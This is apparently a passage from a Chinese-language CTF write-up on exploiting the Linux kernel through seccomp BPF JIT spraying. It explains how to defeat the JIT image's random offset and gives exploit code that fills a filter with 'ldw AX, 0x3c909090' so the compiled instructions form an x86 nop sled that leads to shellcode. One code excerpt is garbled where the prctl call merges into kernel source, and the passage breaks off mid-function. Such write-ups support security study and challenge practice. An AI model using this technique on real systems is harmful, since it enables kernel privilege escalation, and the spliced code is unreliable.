        struct sock_fprog {
           unsigned short      len;    /* 有多少条BPF程序 */
           struct sock_filter *filter; /* 指向BPF指令数组 */
       } prog;
        prog.len = len;
        prog.filter = insn;
        if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)pages = pages; //占据多少页
        //size根据PAGE_SIZE向上对齐, 为真正分配的内存, (proglen + sizeof(*hdr)为真正使用的内存, 两者的差就可作为随机偏移的范围
        hole = min_t(unsigned int, size - (proglen + sizeof(*hdr)), PAGE_SIZE - sizeof(*hdr)); 
        start = (get_random_int() % hole) & ~(alignment - 1);   // start为hole中随机偏移的结果
        /* *image_ptr为hdr中JIT指令真正开始写入的位置 */
        *image_ptr = &hdr->image[start];
        return hdr;
    }
我们也可以抛开推导过程, 形象些理解. 把`bpf_binary_header`想象为一个PAGE_SIZE长的线段A.
JIT编译出的指令就是其中长为`prog_len`的线段B. 线段B在线段A中随机浮动, 很显然如果两个线段长度一样, 那么就不会晃来晃去,
也就没随机化可言了, 内核为了防止这种情况强制要求空出128B空间, 那么自然是把剩余空间都占满最好.
注意prog_len指的是JIT编译成x86指令的长度, 我们还要换算成eBPF指令的长度, 如果每一条都是`ldw AX, ...`翻译为`mov
eax, ...`的话, 那么`eBPF指令:x86指令长度=8:5`, 换算一下eBPF指令最好为`(PAGE_SIZE-128-4)*8/5 =
0x18c6`. 考虑到函数序言和函数收尾的指令, 以及eBPF不完全是`ldw AX, ...`, 为了不给自己挖抗, eBPF指令还要短一些,
我这里取`0x1780`最为最终的eBPF指令的长度, 大家也可以视情况调整.
因此可以写入如下exp. 预先用`ldw AX, 0x3c909090`填充, 因为编译为x86之后为`nop; nop; nop; cmp al,
0xb8; nop; nop; nop; cmp al, 0xb8; ...`, 可以构建一个nop滑行,
只要命中这部分任意位置都可以成功执行尾部的shellcode
    int main(void)
    {
        unsigned int prog_len = 0x1780/8;
        struct sock_filter *prog = malloc(prog_len*sizeof(struct sock_filter));
        for(int i=0; i<prog_len; i++)
        {
            //ldw AX, 0x3c909090
            prog[i].code = 0x00;  
            prog[i].jt = 0x00;
            prog[i].jf = 0x00;
            prog[i].k = 0x3c909090; //fill with x86 ins nop. 
        }
        //ret ALLOW, allow any syscall
        prog[prog_len-1].code = 0x06;
        prog[prog_len-1].jt = 0x00;
        prog[prog_len-1].jf = 0x00;
        prog[prog_len-1].k = 0x7FFF0000;  
        install_seccomp(prog, prog_len);
        getchar();
    }
编译结果如下, 可以看到命中率很高, 可直接绕过随机偏移的限制
利用题目的系统调用就可以直接跳转到偏移0x300的位置, 就可以错位解读JIT编译出的指令
    void sys_seccon(void *addr){